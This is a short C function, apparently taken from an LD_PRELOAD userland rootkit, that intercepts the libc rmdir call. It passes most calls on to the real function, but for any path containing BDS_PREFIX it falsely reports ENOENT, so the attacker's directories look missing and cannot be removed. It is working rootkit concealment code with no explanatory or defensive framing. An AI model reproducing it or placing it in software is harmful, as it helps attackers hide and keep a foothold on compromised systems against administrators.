int rmdir(const char *pathname) {
	if (!orig_rmdir)
		orig_rmdir = dlsym(RTLD_NEXT,"rmdir");
	if (debug == 1)
		printf("\nrmdir  : %s\n", pathname);
	if (strstr(pathname, BDS_PREFIX)) {
		errno = ENOENT;
		return -1;
	}
    
	return orig_rmdir(pathname);
}